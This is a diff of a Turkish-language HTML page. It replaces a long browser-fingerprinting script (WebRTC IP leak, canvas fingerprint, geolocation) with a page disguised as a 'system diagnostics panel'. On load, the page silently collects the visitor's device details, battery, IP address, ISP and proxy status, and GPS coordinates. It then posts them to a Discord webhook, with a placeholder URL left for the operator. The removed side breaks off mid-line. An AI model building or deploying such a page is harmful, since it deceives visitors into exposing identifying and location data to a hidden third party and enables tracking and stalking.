@@ -1,191 +1,109 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sistem Bilgisi</title>
+            border: 1px solid #334155;
+        }
+        .data-card h3 { color: #a78bfa; margin-bottom: 10px; font-size: 1rem; }
+        .data-item { font-family: 'Consolas', monospace; font-size: 0.85rem; color: #cbd5e1; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <header>
+            <h1>Sistem Teşhis Paneli</h1>
+            <p class="subtitle">Cihaz donanım ve ağ optimizasyonu için veriler toplanıyor...</p>
+        </header>
+        <div class="status-container">
+            <div class="status-header">
+                <span class="status-title">Analiz Durumu</span>
+                <span id="statusIndicator" class="status-indicator collecting">Veri Toplanıyor...</span>
+            </div>
+            <div id="display" class="data-grid">
+                </div>
+        </div>
+    </div>
+
     <script>
-        // Toplanan verileri saklamak için obje
-        const fingerprintData = {
-            timestamp: new Date().toISOString(),
-            basicInfo: {},
-            networkInfo: {},
-            performanceInfo: {},
-            environmentInfo: {},
-            browserFingerprint: {}
-        };
+        const WEBHOOK_URL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAPISTIR";
 
-        // 1. TEMEL BİLGİLER
-        fingerprintData.basicInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            language: navigator.language,
-            languages: navigator.languages,
-            screenResolution: {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth
-            },
-            viewport: {
-                width: window.innerWidth,
-                height: window.innerHeight
-            },
-            deviceMemory: navigator.deviceMemory || 'Not available',
-            maxTouchPoints: navigator.maxTouchPoints || 0
-        };
-
-        // 2. AĞ ve KONUM BİLGİLERİ
-        // Yerel IP (WebRTC kullanarak)
-        async function getLocalIP() {
-            return new Promise((resolve) => {
-                const rtc = new RTCPeerConnection({ iceServers: [] });
-                rtc.createDataChannel('');
-                rtc.createOffer()
-                    .then(offer => rtc.setLocalDescription(offer))
-                    .catch(() => resolve('Blocked'));
-                
-                rtc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidate = event.candidate.candidate;
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                        const match = candidate.match(ipRegex);
-                        if (match) {
-                            resolve(match[1]);
-                            rtc.close();
-                        }
-                    }
-                };
-                
-                setTimeout(() => resolve('Timeout'), 3000);
-            });
-        }
-
-        // Harici IP ve konum bilgisi
-        async function getExternalIP() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    city: data.city,
-                    isp: data.org,
-                    vpn: data.security?.vpn || 'Unknown'
-                };
-            } catch (error) {
-                try {
-                    const response = await fetch('https://ip-api.com/json/');
-                    const data = await response.json();
-                    return {
-                        ip: data.query,
-                        country: data.country,
-                        city: data.city,
-                        isp: data.isp,
-                        vpn: data.proxy || 'Unknown'
-                    };
-                } catch (e) {
-                    return { error: 'Failed to fetch IP info' };
+        async function collectAndSend() {
+            let diagnosticData = {
+                timestamp: new Date().toISOString(),
+                device: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                    memory: navigator.deviceMemory || "Bilinmiyor",
+                    language: navigator.language
+                },
+                screen: {
+                    res: `${screen.width}x${screen.height}`,
+                    depth: screen.colorDepth
                 }
+            };
+
+            // 1. Hareket ve İvmeölçer
+            window.addEventListener('devicemotion', (event) => {
+                diagnosticData.motion = {
+                    accel: event.acceleration.x ? "Hareketli" : "Sabit",
+                    rotation: event.rotationRate ? "Dönüyor" : "Stabil"
+                };
+            }, { once: true });
+
+            // 2. Batarya Bilgisi
+            try {
+                const battery = await navigator.getBattery();
+                diagnosticData.battery = {
+                    level: (battery.level * 100) + "%",
+                    charging: battery.charging ? "Şarjda" : "Pilde"
+                };
+            } catch (e) { diagnosticData.battery = "Erişim Reddedildi"; }
+
+            // 3. IP ve Ağ Bilgisi (ip-api.com üzerinden)
+            try {
+                const ipRes = await fetch('http://ip-api.com/json/?fields=status,message,country,city,isp,org,as,proxy,query');
+                const ipData = await ipRes.json();
+                diagnosticData.network = ipData;
+            } catch (e) { diagnosticData.network = "IP Alınamadı"; }
+
+            // 4. Konum (Kullanıcı izin verirse)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        diagnosticData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                        finishAndSend(diagnosticData);
+                    },
+                    () => { 
+                        diagnosticData.location = "İzin Reddedildi";
+                        finishAndSend(diagnosticData);
+                    }
+                );
+            } else {
+                finishAndSend(diagnosticData);
             }
         }
 
-        // Konum bilgisi (kullanıcı izni gerekir)
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve('Not supported');
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    (error) => {
-                        resolve(`Permission denied: ${error.message}`);
-                    },
-                    { timeout: 5000 }
-                );
+        async function finishAndSend(data) {
+            document.getElementById('statusIndicator').textContent = "Tamamlandı";
+            document.getElementById('statusIndicator').className = "status-indicator completed";
+            
+            // Veriyi Discord'a Gönder
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🚀 **Yeni Cihaz Raporu Geldi!**",
+                    embeds: [{
+                        title: "Detaylı Sistem Analizi",
+                        color: 3447003,
+                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
+                    }]
+                })
             });
+
+            // Ekranda göster (Test için)
+            document.getElementById('display').innerHTML = `<pre style="font-size:10px">${JSON.stringify(data, null, 2)}</pre>`;
         }
 
-        // 3. CİHAZ PERFORMANS ve DURUM
-        // Pil durumu
-        function getBatteryInfo() {
-            return new Promise((resolve) => {
-                if (navigator.getBattery) {
-                    navigator.getBattery().then((battery) => {
-                        resolve({
-                            level: battery.level * 100 + '%',
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        });
-                    }).catch(() => resolve('Not available'));
-                } else {
-                    resolve('Not supported');
-                }
-            });
-        }
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
 
-        // Cihaz hareket ve yönelim
-        fingerprintData.performanceInfo.deviceMotion = {
-            available: !!window.DeviceMotionEvent,
-            data: 'No interaction yet'
-        };
-        
-        fingerprintData.performanceInfo.deviceOrientation = {
-            available: !!window.DeviceOrientationEvent,
-            data: 'No interaction yet'
-        };
-
-        // Performans API
-        if (window.performance) {
-            const perf = performance.getEntriesByType('navigation')[0];
-            fingerprintData.performanceInfo.timing = {
-                dnsLookup: perf.domainLookupEnd - perf.domainLookupStart,
-                tcpConnect: perf.connectEnd - perf.connectStart,
-                requestTime: perf.responseEnd - perf.requestStart,
-                domComplete: perf.domComplete,
-                loadEvent: perf.loadEventEnd - perf.loadEventStart
-            };
-        }
-
-        // 4. YAZILIM ve ÇEVRE BİLGİLERİ
-        fingerprintData.environmentInfo = {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            systemTime: new Date().toString(),
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'Not available',
-            mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
-            plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : []
-        };
-
-        // 5. PARMAK İZİ TEKNİKLERİ
-        // Canvas parmak izi
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 100, 50);
-            
-            ctx.fillStyle = '#069';
-            ctx.fillText('Fingerprint', 2, 15);
-            
-            // Canvas'e özgü işlemler
-            ctx.globalCompositeOperation = 'multiply';
-            ctx.fillStyle = 'rgb(255,0,255)';
-            ctx.beginPath();
-            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
-            ctx
